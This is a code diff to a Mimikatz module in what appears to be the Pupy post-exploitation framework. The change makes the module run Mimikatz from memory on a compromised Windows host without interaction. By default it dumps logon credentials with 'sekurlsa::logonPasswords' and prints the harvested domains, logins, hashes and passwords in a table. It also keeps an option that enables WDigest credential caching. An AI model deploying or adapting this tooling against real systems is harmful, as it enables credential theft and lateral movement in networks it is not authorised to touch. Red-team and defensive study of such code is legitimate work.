@@ -4,10 +4,10 @@
 
 from pupylib.PupyModule import (
     config, PupyArgumentParser,
-    REQUIRE_TERMINAL
+    REQUIRE_NOTHING
 )
 
-from pupylib.PupyOutput import Error
+from pupylib.PupyOutput import Error, Table
 
 from modules.memory_exec import MemoryExec
 from modules.lib.windows.memory_exec import exec_pe
@@ -21,7 +21,7 @@ __class_name__="Mimikatz"
 @config(cat="exploit", compat="windows")
 class Mimikatz(MemoryExec):
     """
-        execute mimikatz from memory
+        execute mimikatz from memory (non-interactive)
     """
 
     dependencies = [
@@ -30,18 +30,19 @@ class Mimikatz(MemoryExec):
         'pupwinutils.wdigest'
     ]
 
-    io = REQUIRE_TERMINAL
+    io = REQUIRE_NOTHING
 
     @classmethod
     def init_argparse(cls):
         cls.arg_parser = PupyArgumentParser(prog="mimikatz", description=cls.__doc__)
         cls.arg_parser.add_argument(
-            'args', nargs='*', help='run mimikatz commands from argv (let empty to open mimikatz interactively)')
+            'args', nargs='*', help='run mimikatz commands from argv (let empty to use loginPasswords)')
+        cls.arg_parser.add_argument(
+            '-v', '--verbose', action='store_true', default=False,
+            help='Show arguments and stdout')
         cls.arg_parser.add_argument(
             "--wdigest", choices={'check', 'enable', 'disable'},
             default='', help="Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1")
-        cls.arg_parser.add_argument(
-            '--logonPasswords', action='store_true', default=False, help='retrieve passwords from memory')
 
     def run(self, args):
 
@@ -72,38 +73,39 @@ class Mimikatz(MemoryExec):
 
         if not os.path.isfile(mimikatz_path):
             self.error("Mimikatz exe %s not found ! please edit Mimikatz section in pupy.conf"%mimikatz_path)
-        else:
-            mimikatz_args = args.args
-            interactive = False
+            return
 
-            if not mimikatz_args:
-                interactive = True
-            else:
-                mimikatz_args.append('exit')
+        mimikatz_args = args.args
 
-            if args.logonPasswords:
-                mimikatz_args = ['privilege::debug', 'sekurlsa::logonPasswords', 'exit']
-                interactive = True
+        if not mimikatz_args:
+            mimikatz_args = ['privilege::debug', 'sekurlsa::logonPasswords']
 
-            output = exec_pe(self, mimikatz_args, path=mimikatz_path, interactive=interactive)
+        mimikatz_args.append('exit')
 
-            try:
-                from pykeyboard import PyKeyboard
-                k = PyKeyboard()
-                k.press_key(k.enter_key)
-                k.release_key(k.enter_key)
-            except:
-                pass
+        if args.verbose:
+            self.log('Execute: ' + repr(mimikatz_args))
 
-        # store credentials into the database
-        if output:
-            try:
-                creds = self.parse_mimikatz(output)
-                db = Credentials(client=self.client, config=self.config)
-                db.add(creds)
-                self.success("Credentials stored on the database")
-            except:
-                self.error('No credentials stored in the database')
+        output = exec_pe(self, mimikatz_args, path=mimikatz_path, interactive=False)
+        if not output:
+            self.warning('No output')
+            return
+
+        if args.verbose:
+            self.log(output)
+
+        creds = self.parse_mimikatz(output)
+        if not creds:
+            self.warning('No credentials found')
+            return
+
+        try:
+            # store credentials into the database
+            db = Credentials(client=self.client, config=self.config)
+            db.add(creds)
+            self.log(Table(creds, ['domain', 'login', 'hash', 'password']))
+            self.success("Credentials stored on the database")
+        except:
+            self.error('No credentials stored in the database')
 
     def parse_mimikatz(self, data):
         """
